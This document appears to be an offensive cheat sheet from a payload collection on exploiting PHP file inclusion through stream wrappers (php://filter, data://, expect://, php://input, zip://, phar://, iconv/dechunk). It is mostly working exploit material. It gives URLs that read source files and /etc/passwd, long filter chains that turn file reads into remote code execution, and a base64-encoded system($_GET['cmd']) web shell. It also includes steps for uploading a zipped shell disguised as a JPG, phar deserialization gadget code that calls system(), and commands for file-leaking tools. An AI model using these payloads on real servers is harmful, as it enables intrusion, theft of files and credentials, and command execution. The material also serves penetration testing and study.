# inclusion using wrappers

a wrapper in the context of file inclusion vulnerabilities refers to the protocol or method used to access or include a file. wrappers are often used in php or other server-side languages to extend how file inclusion functions, enabling the use of protocols like http, ftp, and others in addition to the local filesystem.

## summary

- [wrapper php://filter](#wrapper-phpfilter)
- [wrapper data://](#wrapper-data)
- [wrapper expect://](#wrapper-expect)
- [wrapper input://](#wrapper-input)
- [wrapper zip://](#wrapper-zip)
- [wrapper phar://](#wrapper-phar)
    - [phar archive structure](#phar-archive-structure)
    - [phar deserialization](#phar-deserialization)
- [wrapper convert.iconv:// and dechunk://](#wrapper-converticonv-and-dechunk)
    - [leak file content from error-based oracle](#leak-file-content-from-error-based-oracle)
    - [leak file content inside a custom format output](#leak-file-content-inside-a-custom-format-output)
- [references](#references)


## wrapper php://filter

the part "`php://filter`" is case insensitive

| filter | description |
| ------ | ----------- |
| `php://filter/read=string.rot13/resource=index.php` | display index.php as rot13 |
| `php://filter/convert.iconv.utf-8.utf-16/resource=index.php` | encode index.php from utf8 to utf16  |
| `php://filter/convert.base64-encode/resource=index.php` | display index.php as a base64 encoded string |


```powershell
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
```

wrappers can be chained with a compression wrapper for large files.

```powershell
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
```

note: wrappers can be chained multiple times using `|` or `/`:

- multiple base64 decodes: `php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=%s`
- deflate then `base64encode` (useful for limited character exfil): `php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/index.php`

```powershell
./kadimus -u "http://example.com/index.php?page=vuln" -s -f "index.php%00" -o index.php --parameter page 
curl "http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d > index.php
```

also there is a way to turn the `php://filter` into a full rce. 

* [synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) - a cli to generate php filters chain
  ```powershell
  $ python3 php_filter_chain_generator.py --chain '<?php phpinfo();?>'
  [+] the following gadget chain will generate the following code : <?php phpinfo();?> (base64 value: pd9wahagcghwaw5mbygpoz8+)
  php://filter/convert.iconv.utf8.csiso2022kr|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.utf8.utf16|convert.iconv.ucs-2.utf8|convert.iconv.l6.utf8|convert.iconv.l4.ucs2|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.iso2022kr.utf16|convert.iconv.l6.ucs2|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.865.utf16|convert.iconv.cp901.iso6937|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.csa_t500.utf-32|convert.iconv.cp857.iso-2022-jp-3|convert.iconv.iso2022jp2.cp775|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.ibm891.csunicode|convert.iconv.iso8859-14.iso6937|convert.iconv.big-five.ucs-4|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.se2.utf-16|convert.iconv.csibm921.naplps|convert.iconv.855.cp936|convert.iconv.ibm-932.utf-8|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.851.utf-16|convert.iconv.l1.t.618bit|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.js.unicode|convert.iconv.l4.ucs2|convert.iconv.ucs-2.osf00030010|convert.iconv.csibm1008.utf32be|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.se2.utf-16|convert.iconv.csibm921.naplps|convert.iconv.cp1163.csa_t500|convert.iconv.ucs-2.mscp949|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.utf8.utf16le|convert.iconv.utf8.csiso2022kr|convert.iconv.utf16.euctw|convert.iconv.8859_3.ucs2|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.se2.utf-16|convert.iconv.csibm1161.ibm-932|convert.iconv.ms932.ms936|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.cp1046.utf32|convert.iconv.l6.ucs-2|convert.iconv.utf-16le.t.61-8bit|convert.iconv.865.ucs-4le|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.mac.utf16|convert.iconv.l8.utf16be|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.csgb2312.utf-32|convert.iconv.ibm-1161.ibm932|convert.iconv.gb13000.utf16be|convert.iconv.864.utf-32le|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.l6.unicode|convert.iconv.cp1282.iso-ir-90|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.l4.utf32|convert.iconv.cp1250.ucs-2|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.se2.utf-16|convert.iconv.csibm921.naplps|convert.iconv.855.cp936|convert.iconv.ibm-932.utf-8|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.8859_3.utf16|convert.iconv.863.shift_jisx0213|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.cp1046.utf16|convert.iconv.iso6937.shift_jisx0213|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.cp1046.utf32|convert.iconv.l6.ucs-2|convert.iconv.utf-16le.t.61-8bit|convert.iconv.865.ucs-4le|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.mac.utf16|convert.iconv.l8.utf16be|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.csibm1161.unicode|convert.iconv.iso-ir-156.johab|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.inis.utf16|convert.iconv.csibm1133.ibm943|convert.iconv.ibm932.shift_jisx0213|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.se2.utf-16|convert.iconv.csibm1161.ibm-932|convert.iconv.ms932.ms936|convert.iconv.big5.johab|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.base64-decode/resource=php://temp
  ```

* [lfi2rce.py](./lfi2rce.py) to generate a custom payload.
  ```powershell
  # vulnerable file: index.php
  # vulnerable parameter: file
  # executed command: id
  # executed php code: <?=`$_get[0]`;;?>
  curl "127.0.0.1:8000/index.php?0=id&file=php://filter/convert.iconv.utf8.csiso2022kr|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.utf8.utf16le|convert.iconv.utf8.csiso2022kr|convert.iconv.ucs2.euctw|convert.iconv.l4.utf8|convert.iconv.iec_p271.ucs2|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.utf8.csiso2022kr|convert.iconv.iso2022kr.utf16|convert.iconv.l7.naplps|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.utf8.csiso2022kr|convert.iconv.iso2022kr.utf16|convert.iconv.ucs-2le.ucs-2be|convert.iconv.tcvn.ucs2|convert.iconv.857.shiftjisx0213|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.utf8.utf16le|convert.iconv.utf8.csiso2022kr|convert.iconv.ucs2.euctw|convert.iconv.l4.utf8|convert.iconv.866.ucs2|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.utf8.csiso2022kr|convert.iconv.iso2022kr.utf16|convert.iconv.l3.t.61|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.utf8.utf16le|convert.iconv.utf8.csiso2022kr|convert.iconv.ucs2.utf8|convert.iconv.sjis.gbk|convert.iconv.l10.ucs2|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.utf8.utf16le|convert.iconv.utf8.csiso2022kr|convert.iconv.ucs2.utf8|convert.iconv.iso-ir-111.ucs2|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.utf8.utf16le|convert.iconv.utf8.csiso2022kr|convert.iconv.ucs2.utf8|convert.iconv.iso-ir-111.ujis|convert.iconv.852.ucs2|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.utf8.utf16le|convert.iconv.utf8.csiso2022kr|convert.iconv.utf16.euctw|convert.iconv.cp1256.ucs2|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.utf8.csiso2022kr|convert.iconv.iso2022kr.utf16|convert.iconv.l7.naplps|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.utf8.utf16le|convert.iconv.utf8.csiso2022kr|convert.iconv.ucs2.utf8|convert.iconv.851.utf8|convert.iconv.l7.ucs2|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.utf8.csiso2022kr|convert.iconv.iso2022kr.utf16|convert.iconv.cp1133.ibm932|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.utf8.csiso2022kr|convert.iconv.iso2022kr.utf16|convert.iconv.ucs-2le.ucs-2be|convert.iconv.tcvn.ucs2|convert.iconv.851.big5|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.utf8.csiso2022kr|convert.iconv.iso2022kr.utf16|convert.iconv.ucs-2le.ucs-2be|convert.iconv.tcvn.ucs2|convert.iconv.1046.ucs2|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.utf8.utf16le|convert.iconv.utf8.csiso2022kr|convert.iconv.utf16.euctw|convert.iconv.mac.ucs2|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.utf8.csiso2022kr|convert.iconv.iso2022kr.utf16|convert.iconv.l7.shiftjisx0213|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.utf8.utf16le|convert.iconv.utf8.csiso2022kr|convert.iconv.utf16.euctw|convert.iconv.mac.ucs2|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.utf8.csiso2022kr|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.utf8.utf16le|convert.iconv.utf8.csiso2022kr|convert.iconv.ucs2.utf8|convert.iconv.iso-ir-111.ucs2|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.utf8.csiso2022kr|convert.iconv.iso2022kr.utf16|convert.iconv.iso6937.johab|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.utf8.csiso2022kr|convert.iconv.iso2022kr.utf16|convert.iconv.l6.ucs2|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.utf8.utf16le|convert.iconv.utf8.csiso2022kr|convert.iconv.ucs2.utf8|convert.iconv.sjis.gbk|convert.iconv.l10.ucs2|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.iconv.utf8.csiso2022kr|convert.iconv.iso2022kr.utf16|convert.iconv.ucs-2le.ucs-2be|convert.iconv.tcvn.ucs2|convert.iconv.857.shiftjisx0213|convert.base64-decode|convert.base64-encode|convert.iconv.utf8.utf7|convert.base64-decode/resource=/etc/passwd"
  ```


## wrapper data://

the payload encoded in base64 is "`<?php system($_get['cmd']);echo 'shell done !'; ?>`".

```powershell
http://example.net/?page=data://text/plain;base64,pd9wahagc3lzdgvtkcrfr0vuwydjbwqnxsk7zwnobyanu2hlbgwgzg9uzsahjzsgpz4=
```

fun fact: you can trigger an xss and bypass the chrome auditor with : `http://example.com/index.php?page=data:application/x-httpd-php;base64,phn2zybvbmxvywq9ywxlcnqomsk+`


## wrapper expect://

when used in php or a similar application, it may allow an attacker to specify commands to execute in the system's shell, as the `expect://` wrapper can invoke shell commands as part of its input.

```powershell
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```


## wrapper input://

specify your payload in the post parameters, this can be done with a simple `curl` command.

```powershell
curl -x post --data "<?php echo shell_exec('id'); ?>" "https://example.com/index.php?page=php://input%00" -k -v
```

alternatively, kadimus has a module to automate this attack.

```powershell
./kadimus -u "https://example.com/index.php?page=php://input%00"  -c '<?php echo shell_exec("id"); ?>' -t input
```

## wrapper zip://

1. create an evil payload: `echo "<pre><?php system($_get['cmd']); ?></pre>" > payload.php;`
2. zip the file
  ```python
  zip payload.zip payload.php;
  mv payload.zip shell.jpg;
  rm payload.php
  ```
3. upload the archive and access the file using the wrappers: http://example.com/index.php?page=zip://shell.jpg%23payload.php


## wrapper phar://

### phar archive structure

phar files work like zip files, when you can use the `phar://` to access files stored inside them.

1. create a phar archive containing a backdoor file: `php --define phar.readonly=0 archive.php`

  ```php
  <?php
    $phar = new phar('archive.phar');
    $phar->startbuffering();
    $phar->addfromstring('test.txt', '<?php phpinfo(); ?>');
    $phar->setstub('<?php __halt_compiler(); ?>');
    $phar->stopbuffering();
  ?>
  ```

2. use the `phar://` wrapper: `curl http://127.0.0.1:8001/?page=phar:///var/www/html/archive.phar/test.txt`


### phar deserialization

:warning: this technique doesn't work on php 8+, the deserialization has been removed. 

if a file operation is now performed on our existing phar file via the `phar://` wrapper, then its serialized meta data is unserialized. this vulnerability occurs in the following functions, including file_exists: `include`, `file_get_contents`, `file_put_contents`, `copy`, `file_exists`, `is_executable`, `is_file`, `is_dir`, `is_link`, `is_writable`, `fileperms`, `fileinode`, `filesize`, `fileowner`, `filegroup`, `fileatime`, `filemtime`, `filectime`, `filetype`, `getimagesize`, `exif_read_data`, `stat`, `lstat`, `touch`, `md5_file`, etc.

this exploit requires at least one class with magic methods such as `__destruct()` or `__wakeup()`.
let's take this `anyclass` class as example, which execute the parameter data.

```php
class anyclass {
    public $data = null;
    public function __construct($data) {
        $this->data = $data;
    }
    
    function __destruct() {
        system($this->data);
    }
}

...
echo file_exists($_get['page']);
```

we can craft a phar archive containing a serialized object in its meta-data.

```php
// create new phar
$phar = new phar('deser.phar');
$phar->startbuffering();
$phar->addfromstring('test.txt', 'text');
$phar->setstub('<?php __halt_compiler(); ?>');

// add object of any class as meta data
class anyclass {
    public $data = null;
    public function __construct($data) {
        $this->data = $data;
    }
    
    function __destruct() {
        system($this->data);
    }
}
$object = new anyclass('whoami');
$phar->setmetadata($object);
$phar->stopbuffering();
```

finally call the phar wrapper: `curl http://127.0.0.1:8001/?page=phar:///var/www/html/deser.phar`

note: you can use the `$phar->setstub()` to add the magic bytes of jpg file: `\xff\xd8\xff`

```php
$phar->setstub("\xff\xd8\xff\n<?php __halt_compiler(); ?>");
```


## wrapper convert.iconv:// and dechunk://

### leak file content from error-based oracle

- `convert.iconv://`: convert input into another folder (`convert.iconv.utf-16le.utf-8`)
- `dechunk://`: if the string contains no newlines, it will wipe the entire string if and only if the string starts with a-fa-f0-9

the goal of this exploitation is to leak the content of a file, one character at a time, based on the [downunderctf](https://github.com/downunderctf/challenges_2022_public/blob/main/web/minimal-php/solve/solution.py) writeup.
 
**requirements**:

- backend must not use `file_exists` or `is_file`.
- vulnerable parameter should be in a `post` request. 
  - you can't leak more than 135 characters in a get request due to the size limit

the exploit chain is based on php filters: `iconv` and `dechunk`:

1. use the `iconv` filter with an encoding increasing the data size exponentially to trigger a memory error.
2. use the `dechunk` filter to determine the first character of the file, based on the previous error.
3. use the `iconv` filter again with encodings having different bytes ordering to swap remaining characters with the first one.


exploit using [synacktiv/php_filter_chains_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit), the script will use either the `http status code: 500` or the time as an error-based oracle to determine the character.

```ps1
$ python3 filters_chain_oracle_exploit.py --target http://127.0.0.1 --file '/test' --parameter 0   
[*] the following url is targeted : http://127.0.0.1
[*] the following local file is leaked : /test
[*] running post requests
[+] file /test leak is finished!
```

### leak file content inside a custom format output

* [ambionics/wrapwrap](https://github.com/ambionics/wrapwrap) - generates a `php://filter` chain that adds a prefix and a suffix to the contents of a file.

to obtain the contents of some file, we would like to have: `{"message":"<file contents>"}`.

```ps1
./wrapwrap.py /etc/passwd 'prefix' 'suffix' 1000
./wrapwrap.py /etc/passwd '{"message":"' '"}' 1000
./wrapwrap.py /etc/passwd '<root><name>' '</name></root>' 1000
```

this can be used against vulnerable code like the following.

```php
<?php
  $data = file_get_contents($_post['url']);
  $data = json_decode($data);
  echo $data->message;
?>
```

### leak file content using blind file read primitive

* [ambionics/lightyear](https://github.com/ambionics/lightyear)

```ps1
code remote.py # edit remote.oracle
./lightyear.py test # test that your implementation works
./lightyear.py /etc/passwd # dump a file!
```


## references

* [baby^h master php 2017 - orange tsai (@orangetw) - dec 5, 2021](https://github.com/orangetw/my-ctf-web-challenges#babyh-master-php-2017)
* [iconv, set the charset to rce: exploiting the libc to hack the php engine (part 1) - charles fol - may 27, 2024](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)
* [introducing lightyear: a new way to dump php files - charles fol - november 4, 2024](https://www.ambionics.io/blog/lightyear-file-dump)
* [introducing wrapwrap: using php filters to wrap a file with a prefix and suffix - charles fol - december 11, 2023](https://www.ambionics.io/blog/wrapwrap-php-filters-suffix)
* [it's a php unserialization vulnerability jim but not as we know it - sam thomas - august 10, 2018](https://github.com/s-n-t/presentations/blob/master/us-18-thomas-it's-a-php-unserialization-vulnerability-jim-but-not-as-we-know-it.pdf)
* [new php exploitation technique - dr. johannes dahse - august 14, 2018](https://web.archive.org/web/20180817103621/https://blog.ripstech.com/2018/new-php-exploitation-technique/)
* [offensivecon24 - charles fol- iconv, set the charset to rce - june 14, 2024](https://youtu.be/dqkfhjck9hm)
* [php filter chains: file read from error-based oracle - rémi matasse - march 21, 2023](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html)
* [php filters chain: what is it and how to use it - rémi matasse - october 18, 2022](https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html)
* [solving "includer's revenge" from hxp ctf 2021 without controlling any files - @loknop - december 30, 2021](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)